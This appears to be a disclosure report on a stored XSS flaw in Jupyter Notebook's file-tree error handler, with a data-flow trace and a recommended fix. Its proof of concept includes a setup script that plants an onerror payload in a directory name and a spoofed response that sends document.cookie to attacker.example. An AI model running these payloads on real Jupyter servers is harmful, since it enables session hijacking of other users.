# Bug 12 — Stored XSS via `error.message` in `notebooklist.js:548`

**TYPE:** Stored XSS  
**SEVERITY:** High  
**FILE:** `opt/mamba/lib/python3.7/site-packages/notebook/static/tree/js/notebooklist.js`  
**LINE:** 548  
**AGENT ROLE:** 5 (Sanitization Bypass / Edge Case Analyst)

---

## Vulnerability Summary

When the Jupyter Notebook file tree renders a directory listing, `NotebookList.prototype.add_header_footer()` 
looks for files named `header.md` and `footer.md` to display as rendered Markdown banners. If the 
Contents API call to fetch one of these files **fails**, the error handler on line 548 appends the 
error message directly into the DOM using jQuery's `.append()`:

```javascript
// notebooklist.js:548 — the vulnerable line
span12.append(i18n.msg._("Server error: ") + error.message);
```

jQuery's `.append(string)` **parses HTML tags** in the string argument, so any HTML in `error.message` 
is rendered as live DOM elements, enabling XSS.

## Data Flow Trace

```
1. Directory contains a file named "header.md" (or "footer.md")
   └── notebooklist.js:551  list.content.find(el => el.name == "header.md")

2. Contents API GET request is made to fetch the file
   └── notebooklist.js:543  that.contents.get(list_item.path, {"content": true})
   └── contents.js:87-102   Contents.prototype.get → utils.promising_ajax(url, settings)

3. API request fails — jQuery $.ajax triggers error callback
   └── utils.js:833-836     settings.error → reject(wrap_ajax_error(jqXHR, status, error))

4. wrap_ajax_error creates Error object with message from ajax_error_msg()
   └── utils.js:778-785     new Error(ajax_error_msg(jqXHR))

5. ajax_error_msg extracts message from server JSON response
   └── utils.js:713-725     returns jqXHR.responseJSON.message   ← ATTACKER-CONTROLLED
                             OR     jqXHR.responseJSON.traceback  ← ATTACKER-CONTROLLED
                             OR     jqXHR.statusText

6. Error message is concatenated with prefix and passed to jQuery .append()
   └── notebooklist.js:548  span12.append("Server error: " + error.message)  ← SINK (HTML parsed)
```

## Why This Is Exploitable

The `error.message` value comes from `ajax_error_msg()` in `utils.js:713-725`:

```javascript
var ajax_error_msg = function (jqXHR) {
    if (jqXHR.responseJSON && jqXHR.responseJSON.traceback) {
        return jqXHR.responseJSON.traceback;    // priority 1: traceback
    } else if (jqXHR.responseJSON && jqXHR.responseJSON.message) {
        return jqXHR.responseJSON.message;       // priority 2: message
    } else {
        return jqXHR.statusText;                 // priority 3: HTTP status text
    }
};
```

The Jupyter Contents API reflects **file paths** in error messages. When a `header.md` request fails,
the server-side error includes the path that was requested. If the directory name or a symlink target 
contains HTML, that HTML passes through:

- `error.message` → unsanitized string containing HTML
- `jQuery.append(string)` → parses `<tags>` as live HTML elements
- Result: script execution in the user's browser session

## Attack Scenario

### Scenario: Malicious directory name with `header.md` symlink

An attacker with write access to the Jupyter file system (e.g., a shared multi-tenant EMR Studio 
workspace, a shared JupyterHub, or via a malicious notebook that creates files) can:

1. Create a directory with a crafted name containing an XSS payload
2. Place a `header.md` file (or symlink) inside it that will cause a server-side error when fetched
3. When any user navigates to that directory in the Jupyter file browser, the error handler fires 
   and the payload in the error message renders as HTML

## Proof of Concept

### Step 1 — Set up the trigger directory

On the Jupyter server filesystem (e.g., via a terminal or another notebook):

```bash
# Create a directory whose name contains an XSS payload.
# The Contents API will reflect this name in error responses.
mkdir -p '/home/jupyter/work/<img src=x onerror=alert(document.domain)>'

# Create a header.md symlink pointing to a non-existent target.
# This causes the Contents API GET to fail with an error that includes the path.
ln -s /nonexistent '/home/jupyter/work/<img src=x onerror=alert(document.domain)>/header.md'
```

### Step 2 — Victim navigates to the directory

When any user browses to the crafted directory in the Jupyter file tree UI:

```
https://<jupyter-host>/tree/<img src=x onerror=alert(document.domain)>
```

### Step 3 — XSS executes

The file browser detects `header.md` in the directory listing → calls `contents.get()` → 
the request fails because the symlink target doesn't exist → the error handler on line 548 runs:

```javascript
// error.message contains something like:
// "No such file or directory: /home/jupyter/work/<img src=x onerror=alert(document.domain)>/header.md"

span12.append("Server error: " + error.message);
// jQuery parses the <img> tag → onerror fires → alert(document.domain)
```

### Alternative trigger: Intercepted/spoofed API response

If the attacker can influence the Contents API response (e.g., via a malicious Jupyter server 
extension or MITM), they can return a crafted JSON error body directly:

```json
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "message": "<img src=x onerror='fetch(`https://attacker.example/steal?c=`+document.cookie)'>",
  "reason": "Internal Server Error"
}
```

This is the most direct exploitation path since `ajax_error_msg()` returns 
`jqXHR.responseJSON.message` verbatim, and no encoding is applied before `.append()`.

## Simulated DOM Exploitation

The following cell simulates what happens in the browser when line 548 executes with a 
malicious `error.message`. This demonstrates the jQuery `.append()` HTML-parsing behavior 
without requiring a running Jupyter server.

In [ ]:
# Simulated PoC — demonstrates the data flow and jQuery .append() behavior
#
# This Python simulation shows how the error message flows from the server
# response through to the vulnerable jQuery .append() call.

from IPython.display import display, HTML

# ============================================================
# 1. Simulate the server-side error response
# ============================================================

# When header.md cannot be read, the Jupyter Contents API returns
# a JSON error response. The 'message' field includes the file path.
simulated_api_error_response = {
    "message": 'No such file or directory: '
               '/home/jupyter/work/<img src=x onerror=alert(document.domain)>/header.md',
    "reason": "Internal Server Error"
}

print("=== Simulated API Error Response ===")
print(f"HTTP 500 → responseJSON.message:")
print(f"  {simulated_api_error_response['message']}")
print()

# ============================================================
# 2. Simulate ajax_error_msg() from utils.js:713-725
# ============================================================

# ajax_error_msg picks responseJSON.message (priority 2)
def ajax_error_msg(responseJSON):
    if responseJSON and responseJSON.get('traceback'):
        return responseJSON['traceback']
    elif responseJSON and responseJSON.get('message'):
        return responseJSON['message']
    else:
        return 'Unknown Error'

error_message = ajax_error_msg(simulated_api_error_response)
print(f"=== ajax_error_msg() output ===")
print(f"  {error_message}")
print()

# ============================================================
# 3. Simulate the vulnerable line (notebooklist.js:548)
# ============================================================

# This is what gets passed to jQuery's .append():
append_argument = "Server error: " + error_message

print("=== Vulnerable .append() argument ===")
print(f"  span12.append('{append_argument}')")
print()
print("jQuery .append() will parse this string as HTML.")
print("The <img> tag is parsed as a DOM element, and the onerror handler fires.")
print()

# ============================================================
# 4. Show what the browser renders
# ============================================================

# In the real exploit, jQuery creates an <img> element with onerror.
# Here we show a SAFE visualization of what would render:
print("=== Browser DOM result ===")
print("  <div class='list_item row'>")
print("    <div class='col-md-12'>")
print("      Server error: No such file or directory: /home/jupyter/work/")
print("      <img src='x'>  ← onerror=alert(document.domain) FIRES here")
print("      /header.md")
print("    </div>")
print("  </div>")

In [ ]:
# JavaScript simulation — paste in browser DevTools to confirm
# jQuery .append() HTML parsing behavior

js_poc = """
// =============================================
// Browser Console PoC — Bug 12
// Paste this in DevTools on any page with jQuery
// (e.g., the Jupyter tree page itself)
// =============================================

// Simulate the error.message from a failed Contents API call
var errorMessage = 'No such file or directory: /home/jupyter/work/' +
    '<img src=x onerror=alert(document.domain)>/header.md';

// This is exactly what notebooklist.js:548 does:
var container = $('<div/>');
container.append("Server error: " + errorMessage);
// ^^^ The <img> tag is parsed as HTML, onerror fires, XSS achieved.

// Append to body to see the result:
$(document.body).append(container);
"""

print("=== Browser DevTools PoC ===")
print("Paste the following JavaScript in the browser console")
print("on any Jupyter Notebook page (which has jQuery loaded):")
print()
print(js_poc)

In [ ]:
# Automated setup script — creates the malicious directory + symlink
# Run this in a Jupyter terminal or notebook cell on the target server.

import os
import subprocess

JUPYTER_WORK_DIR = os.path.expanduser('~/work')  # default Jupyter working directory
XSS_PAYLOAD = "<img src=x onerror=alert(document.domain)>"

# Create directory with XSS payload in its name
malicious_dir = os.path.join(JUPYTER_WORK_DIR, XSS_PAYLOAD)
os.makedirs(malicious_dir, exist_ok=True)

# Create a header.md symlink to a non-existent file.
# This ensures the Contents API GET fails and returns an error
# containing the directory path (which includes our payload).
symlink_path = os.path.join(malicious_dir, 'header.md')
nonexistent_target = '/nonexistent_target_file'

if os.path.islink(symlink_path):
    os.unlink(symlink_path)

os.symlink(nonexistent_target, symlink_path)

print(f"[+] Created malicious directory: {malicious_dir}")
print(f"[+] Created broken symlink: {symlink_path} -> {nonexistent_target}")
print(f"")
print(f"[*] Now navigate to the directory in the Jupyter file tree:")
print(f"    /tree/{XSS_PAYLOAD}")
print(f"")
print(f"[*] Expected behavior:")
print(f"    1. File browser lists directory contents")
print(f"    2. add_header_footer() detects 'header.md' in listing")
print(f"    3. contents.get() tries to fetch header.md content")
print(f"    4. Server returns 500 with error message containing the path")
print(f"    5. Error handler: span12.append('Server error: ' + error.message)")
print(f"    6. jQuery parses <img> tag → onerror fires → XSS")

## Impact

| Factor | Assessment |
|--------|------------|
| **Attack Vector** | An attacker with filesystem write access creates a malicious directory + broken `header.md` symlink |
| **Persistence** | Stored — the payload persists in the directory name on the filesystem |
| **Trigger** | Any user who navigates to the directory in the Jupyter file tree |
| **Privilege Required** | Filesystem write access (e.g., shared workspace, malicious notebook execution) |
| **Impact** | Session hijacking, cookie theft, keylogging, arbitrary actions as the victim user |
| **Scope** | Multi-tenant environments (EMR Studio, JupyterHub) where users share a filesystem |

## Recommended Fix

Use jQuery's `.text()` instead of `.append()` for the error message, which safely escapes HTML:

```javascript
// BEFORE (vulnerable) — notebooklist.js:548
span12.append(i18n.msg._("Server error: ") + error.message);

// AFTER (safe)
span12.text(i18n.msg._("Server error: ") + error.message);
```

Alternatively, create a text node explicitly:

```javascript
span12.append(document.createTextNode(i18n.msg._("Server error: ") + error.message));
```